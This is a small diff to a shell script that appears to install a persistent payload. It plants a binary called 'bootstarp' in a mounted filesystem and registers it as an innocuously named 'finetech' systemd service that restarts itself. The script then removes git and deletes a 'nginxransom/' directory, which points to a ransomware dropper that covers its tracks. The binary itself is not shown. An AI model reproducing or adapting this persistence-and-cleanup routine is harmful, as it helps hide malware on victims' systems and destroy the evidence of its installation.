@@ -18,8 +18,9 @@ chmod 777 mnt/usr/bin/bootstarp
 echo  "[Unit]\nDescription=finetech\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/bootstarp\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > mnt/usr/lib/systemd/system/finetech.service
 chmod 777  mnt/usr/lib/systemd/system/finetech.service
 chroot mnt/ systemctl daemon-reload
+wait
 chroot mnt/ systemctl enable finetech.service
+wait
 chroot mnt/ systemctl start finetech.service
-chroot mnt/ systemctl daemon-reload
 apt remove git -y
 rm -rf nginxransom/
